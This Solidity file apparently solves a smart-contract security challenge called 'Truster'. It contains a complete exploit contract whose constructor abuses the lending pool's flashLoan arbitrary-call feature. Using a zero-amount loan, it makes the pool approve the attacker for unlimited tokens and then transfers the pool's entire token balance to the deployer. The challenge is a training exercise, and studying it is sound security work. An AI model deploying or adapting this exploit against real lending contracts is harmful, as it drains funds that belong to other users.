// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";

contract Trustee {
    constructor(TrusterLenderPool pool) {
        pool.flashLoan(
            0,
            address(0),
            address(pool.token()),
            abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this),
                type(uint256).max
            )
        );

        pool.token().transferFrom(
            address(pool),
            msg.sender,
            pool.token().balanceOf(address(pool))
        );
    }
}
